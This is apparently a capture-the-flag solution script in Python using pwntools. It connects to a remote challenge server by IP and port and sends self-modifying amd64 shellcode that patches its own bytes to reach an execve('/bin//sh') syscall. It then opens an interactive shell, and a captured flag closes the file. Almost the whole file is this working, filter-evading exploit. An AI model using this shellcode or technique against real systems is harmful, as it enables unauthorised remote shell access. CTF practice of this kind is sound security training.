#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
context(arch='amd64',os='linux',log_level='debug')

# p = process('./pwn')
p = remote('49.235.243.206', 10506)

shell = asm('''
push 0x70
pop rdx
push rdi
push rdi
push rdi
sub byte ptr [rsi + 0x22], dl
sub byte ptr [rsi + 0x2A], dl
sub byte ptr [rsi + 0x2E], dl
sub byte ptr [rsi + 0x2F], dl
sub byte ptr [rsi + 0x45], dl
sub byte ptr [rsi + 0x45], dl
sub byte ptr [rsi + 0x45], dl
pop rsi
pop rsi
pop rdx
push 0x3b
pop rax
''')
shell += "\x48\x2F\x2F\x62\x69\x6E\x2F\x73\x68\x70"
shell += asm("""
push rdi
push rsp
pop rdi
	
""")	

shell += "\x7F\x75" #syscall

p.send(shell)
p.interactive()
# flag{A1191C435648EFFC09A90A8A113117A3}